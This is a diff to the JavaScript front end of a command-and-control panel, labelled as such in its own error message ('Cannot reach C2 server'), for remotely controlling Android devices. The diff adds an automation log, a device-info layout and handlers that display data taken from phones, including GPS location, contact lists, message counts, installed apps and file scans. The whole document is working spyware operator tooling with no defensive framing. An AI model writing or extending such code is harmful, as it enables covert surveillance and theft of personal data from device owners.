@@ -283,7 +283,7 @@ html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--san
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
-var socket=io();var clients=[],selected=null;
+var socket=io();var clients=[],selected=null;var currentMode=null;
 
 var AUTO_CMDS=[
   {order:'get_location',desc:'Request current GPS/Network location coordinates'},
@@ -325,10 +325,13 @@ function sendCmd(type){
   if(!selected){showErr('No Device','Select a device from the sidebar first.');return}
   var c=clients.find(function(x){return x.id===selected});
   if(!c){showErr('Device Offline','This device has disconnected.');enableBtns(false);return}
-  if(type==='location'){socket.emit('order',{id:selected,order:'get_location',params:{}});addLoading('Requesting location...')}
-  else if(type==='contacts'){socket.emit('order',{id:selected,order:'contacts',params:{}});addLoading('Syncing contacts...')}
-  else if(type==='device_info'){socket.emit('order',{id:selected,order:'get_info',params:{}});addLoading('Fetching device info...')}
-  else if(type==='automation'){showAutoPanel()}
+  clearOutput();
+  currentMode=type;
+  document.querySelectorAll('.cmd-btn').forEach(function(b){b.classList.remove('active')});
+  if(type==='location'){document.getElementById('btn-loc').classList.add('active');socket.emit('order',{id:selected,order:'get_location',params:{}});addLoading('Requesting location...')}
+  else if(type==='contacts'){document.getElementById('btn-contacts').classList.add('active');socket.emit('order',{id:selected,order:'contacts',params:{}});addLoading('Syncing contacts...')}
+  else if(type==='device_info'){document.getElementById('btn-info').classList.add('active');socket.emit('order',{id:selected,order:'get_info',params:{}});addLoading('Fetching device info...')}
+  else if(type==='automation'){document.getElementById('btn-auto').classList.add('active');showAutoPanel()}
 }
 
 function addLoading(msg){
@@ -339,31 +342,46 @@ function addLoading(msg){
 }
 function removeLoading(){var el=document.getElementById('loading-ind');if(el)el.remove()}
 
+function appendAutoLog(msg){
+  var area=document.getElementById('auto-log-area');if(!area)return false;
+  var entry=document.createElement('div');entry.className='auto-log ok';entry.style.marginTop='4px';
+  entry.textContent='> ['+new Date().toLocaleTimeString()+'] '+msg;
+  area.appendChild(entry);entry.scrollIntoView({behavior:'smooth',block:'nearest'});
+  return true;
+}
+
+function renderAutoResult(data){
+  if(data.id!==selected)return;
+  if(appendAutoLog('Result: '+(data.data.output||'No output')))return;
+  var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M13 2.05v3.03c3.39.49 6 3.39 6 6.92 0 .9-.18 1.75-.48 2.54l2.6 1.53c.56-1.24.88-2.62.88-4.07 0-5.18-3.95-9.45-9-9.95zM12 19c-3.87 0-7-3.13-7-7 0-3.53 2.61-6.43 6-6.92V2.05c-5.06.5-9 4.76-9 9.95 0 5.52 4.47 10 9.99 10 3.31 0 6.24-1.61 8.06-4.09l-2.6-1.53A6.95 6.95 0 0112 19z"/></svg><h4>Automation Result</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><pre style="font-family:var(--mono);font-size:11px;color:var(--t2);white-space:pre-wrap;word-break:break-all">'+esc(data.data.output||'No output')+'</pre></div>';
+  o.insertBefore(card,o.firstChild);
+}
+
 function showAutoPanel(){
   clearOutput();var o=document.getElementById('output');
   var card=document.createElement('div');card.className='result-card';
   var rows=AUTO_CMDS.map(function(cmd){
     return '<div class="auto-row" data-order="'+cmd.order+'" onclick="fireAuto(\''+cmd.order+'\')"><div class="auto-name">'+cmd.order+'</div><div class="auto-desc">'+cmd.desc+'</div><button class="auto-send" onclick="event.stopPropagation();fireAuto(\''+cmd.order+'\')">SEND</button></div>';
   }).join('');
-  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M13 2.05v3.03c3.39.49 6 3.39 6 6.92 0 .9-.18 1.75-.48 2.54l2.6 1.53c.56-1.24.88-2.62.88-4.07 0-5.18-3.95-9.45-9-9.95zM12 19c-3.87 0-7-3.13-7-7 0-3.53 2.61-6.43 6-6.92V2.05c-5.06.5-9 4.76-9 9.95 0 5.52 4.47 10 9.99 10 3.31 0 6.24-1.61 8.06-4.09l-2.6-1.53A6.95 6.95 0 0112 19z"/></svg><h4>Automation Commands</h4><time>Click to execute</time></div><div class="result-body"><div class="auto-panel">'+rows+'</div><div class="auto-log" id="auto-log">Ready — select a command to send</div></div>';
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M13 2.05v3.03c3.39.49 6 3.39 6 6.92 0 .9-.18 1.75-.48 2.54l2.6 1.53c.56-1.24.88-2.62.88-4.07 0-5.18-3.95-9.45-9-9.95zM12 19c-3.87 0-7-3.13-7-7 0-3.53 2.61-6.43 6-6.92V2.05c-5.06.5-9 4.76-9 9.95 0 5.52 4.47 10 9.99 10 3.31 0 6.24-1.61 8.06-4.09l-2.6-1.53A6.95 6.95 0 0112 19z"/></svg><h4>Automation Commands</h4><time>Click to execute</time></div><div class="result-body"><div class="auto-panel">'+rows+'</div><div id="auto-log-area"><div class="auto-log" id="auto-log">Ready — select a command to send</div></div></div>';
   o.appendChild(card);
 }
 
 function fireAuto(order){
   if(!selected)return;
   socket.emit('order',{id:selected,order:order,params:{}});
-  var log=document.getElementById('auto-log');
-  if(log){log.className='auto-log ok';log.textContent='> Sent "'+order+'" at '+new Date().toLocaleTimeString()}
+  appendAutoLog('Sent "'+order+'"');
   var row=document.querySelector('.auto-row[data-order="'+order+'"]');
   if(row){row.classList.add('sent');setTimeout(function(){row.classList.remove('sent')},1500)}
 }
 
 function renderLocation(data){
   if(data.id!==selected)return;removeLoading();
-  var lat=data.data.lat||0,lon=data.data.lon||0,acc=data.data.accuracy||'?',prov=data.data.provider||'unknown';
+  var lat=data.data.lat||0,lon=data.data.lon||0,acc=data.data.acc||0,alt=data.data.alt||0;
   var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
   var mid='map-'+Date.now();
-  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg><h4>Location</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><div class="map-wrap" id="'+mid+'"></div><div class="coord-row">Lat: <strong>'+lat.toFixed(6)+'</strong> &nbsp; Lon: <strong>'+lon.toFixed(6)+'</strong> &nbsp; Accuracy: <strong>'+acc+'m</strong> &nbsp; Provider: <strong>'+prov.toUpperCase()+'</strong></div></div>';
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg><h4>Location</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><div class="map-wrap" id="'+mid+'"></div><div class="coord-row">Lat: <strong>'+lat.toFixed(6)+'</strong> &nbsp; Lon: <strong>'+lon.toFixed(6)+'</strong> &nbsp; Accuracy: <strong>'+acc+'m</strong> &nbsp; Altitude: <strong>'+alt+'m</strong></div></div>';
   o.insertBefore(card,o.firstChild);
   setTimeout(function(){
     var el=document.getElementById(mid);if(!el)return;
@@ -389,7 +407,7 @@ function renderContacts(data){
 function renderDeviceInfo(data){
   if(data.id!==selected)return;removeLoading();
   var d=data.data;
-  var fields=[['Model',d.model],['Manufacturer',d.manufacturer],['Android',d.version],['SDK',d.sdk],['Fingerprint',d.fingerprint],['Android ID',d.android_id],['Battery',d.battery],['Network',d.network_type],['WiFi SSID',d.wifi_ssid],['WiFi IP',d.wifi_ip],['Operator',d.operator],['Timezone',d.timezone],['Internal Storage',d.internal_storage],['External Storage',d.external_storage]];
+  var fields=[['Model',d.model],['Manufacturer',d.manufacturer],['Brand',d.brand],['Android Version',d.android_version],['SDK',d.sdk_int],['Board',d.board],['Hardware',d.hardware],['Product',d.product],['Device',d.device]];
   var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
   var cells=fields.map(function(f){return '<div class="info-cell"><div class="info-cell-label">'+f[0]+'</div><div class="info-cell-value">'+esc(String(f[1]||'—'))+'</div></div>'}).join('');
   card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg><h4>Device Information</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><div class="info-grid">'+cells+'</div></div>';
@@ -435,10 +453,22 @@ socket.on('client_disconnected',function(id){
 });
 socket.on('client_data',function(p){
   if(!p||!p.data)return;var t=p.data.type;
-  if(t==='location')renderLocation(p);
+  if(currentMode==='automation'&&document.getElementById('auto-log-area')){
+    if(t==='auto_task_result')appendAutoLog('Result: '+(p.data.output||'No output'));
+    else if(t==='geo_ping')appendAutoLog('Location: lat='+p.data.lat+' lon='+p.data.lon+' acc='+(p.data.acc||'?')+'m');
+    else if(t==='contacts_sync'||t==='addr_sync')appendAutoLog('Contacts synced: '+(Array.isArray(p.data.data)?p.data.data.length:0)+' entries');
+    else if(t==='device_info')appendAutoLog('Device: '+(p.data.model||'unknown')+' ('+(p.data.manufacturer||'')+')');
+    else if(t==='apps_list')appendAutoLog('Apps: '+(Array.isArray(p.data.data)?p.data.data.length:0)+' installed');
+    else if(t==='msg_sync')appendAutoLog('Messages: '+(Array.isArray(p.data.data)?p.data.data.length:0)+' synced');
+    else if(t==='fs_scan')appendAutoLog('Files: '+(Array.isArray(p.data.data)?p.data.data.length:0)+' found');
+    else appendAutoLog(t+': received');
+    return;
+  }
+  if(t==='geo_ping')renderLocation(p);
   else if(t==='contacts_sync'||t==='addr_sync')renderContacts(p);
   else if(t==='device_info')renderDeviceInfo(p);
   else if(t==='apps_list')renderApps(p);
+  else if(t==='auto_task_result')renderAutoResult(p);
 });
 socket.on('connect_error',function(){showErr('Connection Error','Cannot reach C2 server.')});
 socket.on('disconnect',function(){showErr('Disconnected','WebSocket lost. Reconnecting...')});
